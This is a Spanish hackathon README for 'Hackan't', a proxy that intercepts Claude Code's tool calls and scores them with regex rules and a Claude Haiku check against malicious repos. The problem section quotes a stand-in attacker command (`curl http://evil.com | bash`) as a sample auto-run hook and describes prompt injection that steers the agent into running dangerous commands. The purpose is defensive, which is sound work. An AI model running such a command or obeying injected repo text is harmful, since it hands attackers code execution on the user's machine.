# Hackan't — Protección contra repos maliciosos para Claude Code

**Track:** AI Security
**Equipo:** team-13 (Buenos Aires)

---

## El problema

Claude Code confía en los proyectos que abre. Un repo malicioso puede incluir hooks que se ejecutan automáticamente al abrir el proyecto (por ejemplo `curl http://evil.com | bash`), o manipular al modelo vía prompt injection para que ejecute comandos peligrosos a través de sus tools (Bash, Write, Edit). El usuario no tiene visibilidad de estos ataques hasta que ya ocurrieron.

---

## La solución

Hackan't agrega una capa de defensa sin cambiar el flujo de trabajo del usuario:

**Proxy de análisis en tiempo real** — Claude Code apunta a la IP local donde corre el cliente en lugar de `api.anthropic.com`. El proxy intercepta cada tool call que el modelo intenta ejecutar y lo analiza antes de devolvérselo al agente.

---

## Arquitectura

```
Usuario → safe-claude.sh → escanea settings.json → backend NestJS
                                                         │
                         Claude Code ←── proxy ──────────┘
                              │              ↑
                              └── tool_use ──┘ (analiza antes de ejecutar)
```

---

## Motor de análisis

El backend corre dos analizadores en paralelo:

- **Motor de reglas** (~0 ms): 15 patrones regex con scores de riesgo individuales. Detecta desde `curl | bash` (score 90) hasta procesos en background persistentes (score 60).
- **Analizador semántico con IA**: se activa solo en la zona gris (score 30–69) para razonar sobre la intención real del comando más allá de los patrones. El score final pondera ambos: `ruleScore × 0.7 + llmScore × 0.3`.

Los veredictos son:
- **ALLOW** (0–29): pasa sin cambios
- **WARN** (30–69): el usuario ve una advertencia inline en Claude Code
- **BLOCK** (70–100): el tool call es reemplazado por un mensaje explicativo

---

## Stack

- **Backend:** NestJS + TypeScript, desplegado en Railway
- **Wrapper:** bash (`safe-claude.sh` + `install.sh`)
- **Modelo de análisis:** Claude Haiku (zona gris)

---

## Instalación en un comando

```bash
./install.sh   # detecta zsh/bash y agrega el alias automáticamente
```

---

## Equipo

- Tomas Ignacio Emanuel ([@tomasemanuel](https://github.com/tomasemanuel))
- Rocio Platini ([@rplatini](https://github.com/rplatini))
- Julieta Zimmerman ([@Julizimmerman](https://github.com/Julizimmerman))
- Magali Burstein ([@Magaliburstein](https://github.com/Magaliburstein))
